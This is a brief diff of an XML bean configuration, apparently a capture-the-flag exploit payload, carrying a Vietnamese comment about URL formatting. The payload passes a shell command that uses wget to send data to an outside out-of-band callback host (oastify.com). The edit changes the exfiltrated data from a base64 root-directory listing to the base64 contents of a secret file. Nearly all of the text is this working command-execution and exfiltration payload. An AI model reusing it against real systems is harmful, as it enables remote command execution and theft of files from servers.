@@ -11,7 +11,7 @@
         <value>-c</value>
         <!-- đúng raw URL, không thêm quotes -->
         <value><![CDATA[
-          wget http://jrenf82hlx9x5krxegoz09bqlhr8f43t.oastify.com?c=$(ls / | base64 -w0)
+          wget http://jrenf82hlx9x5krxegoz09bqlhr8f43t.oastify.com?c=$(cat /8bafb9c2de21-secret.txt | base64 -w0)
         ]]></value>
       </list>
     </constructor-arg>
